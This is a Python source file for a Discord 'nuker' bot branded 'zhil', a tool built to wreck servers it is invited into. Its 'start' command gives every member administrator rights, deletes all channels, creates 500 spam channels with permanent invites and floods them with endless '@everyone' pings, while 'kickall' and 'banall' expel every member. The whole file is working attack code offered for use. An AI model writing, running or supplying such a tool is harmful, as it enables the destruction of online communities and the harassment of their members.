import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

SPAM_CHANNEL =  ["zhildabes"]
SPAM_MESSAGE = ["@everyone"]

client = commands.Bot(command_prefix="?", intents=discord.Intents.all())

@client.event
async def on_ready():
   print(f'''
███████╗██╗░░██╗██╗██╗░░░░░███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
╚════██║██║░░██║██║██║░░░░░████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
░░███╔═╝███████║██║██║░░░░░██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██╔══╝░░██╔══██║██║██║░░░░░██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
███████╗██║░░██║██║███████╗██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚══════╝╚═╝░░╚═╝╚═╝╚══════╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
{client.user.name} Always on your side!
   ''')
   await client.change_presence(activity=discord.Game(name="102/128 Servers"))

@client.command()
@commands.is_owner()
async def kill(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))

@client.command()
async def start(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except Exception as e:
        print(Fore.RED + f"I was unable to give everyone admin: {e}" + Fore.RESET)
    
    # Delete channels in batches with a bigger batch size
    channels = list(guild.channels)
    batch_size = 10
    for i in range(0, len(channels), batch_size):
        batch = channels[i:i + batch_size]
        try:
            await asyncio.gather(*[channel.delete() for channel in batch])
            print(f"Deleted {len(batch)} channels")
            await asyncio.sleep(0.2)  # Shorter delay between batches
        except Exception as e:
            print(f"Error in batch deletion: {e}")
            await asyncio.sleep(2)
    
    print(Fore.MAGENTA + "All channels were deleted." + Fore.RESET)
    
    # Create channels in batches with a bigger batch size and a different name
    try:
        await guild.create_text_channel("zhilalwaysnukes")
        spam_channel_count = 500  # Increased from 100
        batch_size = 10
        
        for i in range(0, spam_channel_count, batch_size):
            batch = []
            for _ in range(min(batch_size, spam_channel_count - i)):
                batch.append(guild.create_text_channel(random.choice(["zhil", "zhilnukes", "zhilalwaysnukes"])))
            
            try:
                await asyncio.gather(*batch)
                print(f"Created {len(batch)} channels")
                await asyncio.sleep(0.1)  # Shorter delay between batches
            except Exception as e:
                print(f"Error in batch creation: {e}")
                await asyncio.sleep(1)
        
        print(f"Nuked {guild.name} Successfully.")
        
        # Create invites in parallel with rate limiting
        channels = guild.text_channels
        for i in range(0, len(channels), batch_size):
            batch = channels[i:i + batch_size]
            try:
                invites = await asyncio.gather(*[ch.create_invite(max_age=0, max_uses=0) for ch in batch])
                for invite in invites:
                    print(f"New Invite: {invite}")
                await asyncio.sleep(0.2)
            except Exception as e:
                print(f"Error creating invites: {e}")
                await asyncio.sleep(1)
                
    except Exception as e:
        print(f"Error in channel creation: {e}")

@client.command()
async def kickall(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    members = guild.members
    for member in members:
        try:
            await member.kick()
            print(f"Kicked {member.name}")
        except Exception as e:
            print(f"Error kicking {member.name}: {e}")

@client.command()
async def banall(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    members = guild.members
    for member in members:
        try:
            await member.ban()
            print(f"Banned {member.name}")
        except Exception as e:
            print(f"Error banning {member.name}: {e}")


client.run("TOKEN-HERE")